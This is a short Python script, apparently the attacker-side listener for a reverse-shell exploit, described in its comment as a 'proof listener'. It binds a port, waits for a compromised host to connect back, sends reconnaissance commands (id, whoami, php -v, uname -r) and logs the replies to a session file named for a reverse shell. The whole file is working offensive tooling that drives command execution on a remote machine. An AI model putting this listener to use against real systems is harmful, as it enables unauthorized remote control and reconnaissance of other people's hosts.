#!/usr/bin/env python3
# Simple proof listener: accept one connection, send commands, capture output.
import socket, sys, time

LPORT = int(sys.argv[1]) if len(sys.argv) > 1 else 1337
OUT = sys.argv[2] if len(sys.argv) > 2 else "/tmp/p2s_rev/rs_session.log"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", LPORT))
s.listen(1)
s.settimeout(60)
log = open(OUT, "wb", 0)
log.write(b"[*] listener bound on %d, waiting\n" % LPORT)
try:
    conn, addr = s.accept()
except socket.timeout:
    log.write(b"[-] no connection within 60s\n")
    sys.exit(1)
log.write(b"[+] CONNECTION FROM %s:%d\n" % (addr[0].encode(), addr[1]))
conn.settimeout(3)
time.sleep(0.5)
for cmd in [b"id\n", b"whoami\n", b"php -v | head -1\n", b"uname -r\n", b"exit\n"]:
    try:
        conn.sendall(cmd)
    except (BrokenPipeError, ConnectionResetError):
        break
    time.sleep(1.2)
    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break
            log.write(data)
    except socket.timeout:
        pass
    except (BrokenPipeError, ConnectionResetError):
        break
log.write(b"\n[*] session captured\n")
conn.close()
